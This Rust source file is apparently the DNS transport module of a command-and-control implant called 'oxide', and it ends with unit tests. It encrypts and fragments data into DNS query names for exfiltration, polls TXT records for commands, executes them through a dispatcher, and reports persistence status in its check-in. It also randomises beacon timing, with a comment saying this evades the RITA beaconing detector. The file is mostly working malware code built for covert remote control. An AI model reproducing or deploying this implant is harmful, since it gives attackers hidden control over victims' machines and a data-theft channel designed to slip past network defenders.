//! DNS C2 transport — TXT polling, encrypt-then-fragment, gamma jitter.
//!
//! Query: {session_6hex}{total_2hex}{idx_2hex}.{BASE32NOPAD_≤55chars}.c2.{domain}
//! Heartbeat: {session_6hex}0000.hb.c2.{domain}  (total=00 idx=00)
//! Response: TXT = BASE32NOPAD(encrypt_stateless(key, json_cmd)) or empty NOERROR

// Transport wiring (T9) not yet complete; suppress until then.
#![allow(dead_code)]

use anyhow::{Context, Result};
use data_encoding::BASE32_NOPAD;
use flate2::{write::GzEncoder, Compression};
use rand::RngCore;
use rand_distr::{Distribution, Gamma};
use std::io::Write;
use std::net::UdpSocket;
use std::time::Duration;

use crate::checkin;
use crate::config::Config;
use crate::dispatcher::Dispatcher;
use crate::dns_wire;
use crate::persistence::PersistenceChain;
use oxide_shared::packet::Packet;

const FRAG_BYTES: usize = 34;
const UDP_TIMEOUT_MS: u64 = 3000;
const MAX_RETRIES: usize = 3;
const C2_DOMAIN: &str = "oxide.lab";
const DNS_PORT: u16 = 10053;

fn meta_label(session: &str, total: u8, idx: u8) -> String {
    format!("{}{:02x}{:02x}", &session[..6], total, idx)
}

/// Gamma(2, base/2) sample, clamped [60s, 6h]. Right-skewed; evades RITA Bowley test.
pub fn gamma_interval(base_secs: f64) -> f64 {
    Gamma::new(2.0_f64, base_secs / 2.0)
        .unwrap()
        .sample(&mut rand::thread_rng())
        .clamp(60.0, 21600.0)
}

fn prepare_ct(key: &[u8; 32], payload: &[u8]) -> Vec<u8> {
    let mut gz = GzEncoder::new(Vec::new(), Compression::default());
    gz.write_all(payload).unwrap();
    oxide_shared::encrypt_stateless(key, &gz.finish().unwrap())
}

fn udp_txt(server: &str, port: u16, qname: &str) -> Result<Option<Vec<u8>>> {
    let sock = UdpSocket::bind("0.0.0.0:0")?;
    sock.set_read_timeout(Some(Duration::from_millis(UDP_TIMEOUT_MS)))?;
    sock.connect(format!("{}:{}", server, port))?;
    let mut id = [0u8; 2];
    rand::thread_rng().fill_bytes(&mut id);
    let pkt = dns_wire::build_txt_query(qname, u16::from_be_bytes(id));
    sock.send(&pkt)?;
    let mut buf = [0u8; 512];
    match sock.recv(&mut buf) {
        Ok(n) => Ok(dns_wire::parse_txt_rdata(&buf[..n])),
        Err(e) if e.kind() == std::io::ErrorKind::WouldBlock
               || e.kind() == std::io::ErrorKind::TimedOut => Ok(None),
        Err(e) => Err(e.into()),
    }
}

fn upload(key: &[u8; 32], session: &str, host: &str, payload: &[u8]) -> Result<()> {
    let ct = prepare_ct(key, payload);
    let chunks: Vec<&[u8]> = ct.chunks(FRAG_BYTES).collect();
    let total = chunks.len().min(255) as u8;
    for (i, chunk) in chunks.iter().enumerate() {
        let label1 = meta_label(session, total, i as u8);
        let label2 = BASE32_NOPAD.encode(chunk).to_ascii_lowercase();
        let qname = format!("{}.{}.c2.{}", label1, label2, C2_DOMAIN);
        let mut sent = false;
        for _ in 0..MAX_RETRIES {
            if udp_txt(host, DNS_PORT, &qname).is_ok() { sent = true; break; }
        }
        if !sent { anyhow::bail!("fragment {} upload failed after {} retries", i, MAX_RETRIES); }
    }
    Ok(())
}

fn poll(key: &[u8; 32], session: &str, host: &str) -> Result<Option<Packet>> {
    let qname = format!("{}0000.hb.c2.{}", &session[..6], C2_DOMAIN);
    match udp_txt(host, DNS_PORT, &qname)? {
        None => Ok(None),
        Some(txt) => {
            let ct = BASE32_NOPAD.decode(&txt.to_ascii_uppercase()).context("b32 decode")?;
            let plain = oxide_shared::decrypt_stateless(key, &ct)
                .map_err(|e| anyhow::anyhow!("{:?}", e))?;
            Ok(Some(serde_json::from_slice(&plain)?))
        }
    }
}

pub struct DnsTransport;

impl DnsTransport {
    pub async fn run(config: &Config, dispatch: &Dispatcher, chain: &PersistenceChain) -> Result<()> {
        let key = oxide_shared::derive_key(&config.psk, &config.salt);
        let mut sid = [0u8; 3];
        rand::thread_rng().fill_bytes(&mut sid);
        let session = hex::encode(sid);

        let pkt = checkin::build_checkin_packet(&chain.check_all());
        upload(&key, &session, &config.host, &serde_json::to_vec(&pkt)?)?;

        loop {
            tokio::time::sleep(Duration::from_secs_f64(
                gamma_interval(config.beacon_base_secs)
            )).await;
            if let Some(cmd) = poll(&key, &session, &config.host)? {
                let resp = dispatch.dispatch(&cmd);
                upload(&key, &session, &config.host, &serde_json::to_vec(&resp)?)?;
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn fqdn_under_90_chars() {
        let frag = vec![0xffu8; FRAG_BYTES];
        let label2 = BASE32_NOPAD.encode(&frag).to_ascii_lowercase();
        let fqdn = format!("{}.{}.c2.oxide.lab", meta_label("aabbcc", 5, 2), label2);
        assert!(fqdn.len() < 90, "FQDN len={}", fqdn.len());
    }

    #[test]
    fn heartbeat_sentinel_encodes() {
        let lbl = meta_label("aabbcc", 0, 0);
        assert_eq!(&lbl[6..8], "00"); // total
        assert_eq!(&lbl[8..10], "00"); // idx
    }

    #[test]
    fn prepare_ct_nonempty() {
        let key = oxide_shared::derive_key("psk", b"test-salt-must-be-32-bytes-long!");
        assert!(!prepare_ct(&key, b"hello world test payload").is_empty());
    }

    #[test]
    fn fragment_b32_valid() {
        let key = oxide_shared::derive_key("psk", b"test-salt-must-be-32-bytes-long!");
        let ct = prepare_ct(&key, b"test payload");
        for chunk in ct.chunks(FRAG_BYTES) {
            let b32 = BASE32_NOPAD.encode(chunk).to_ascii_uppercase();
            BASE32_NOPAD.decode(b32.as_bytes()).unwrap();
        }
    }

    #[test]
    fn gamma_positive() {
        assert!(gamma_interval(7200.0) > 0.0);
    }
}
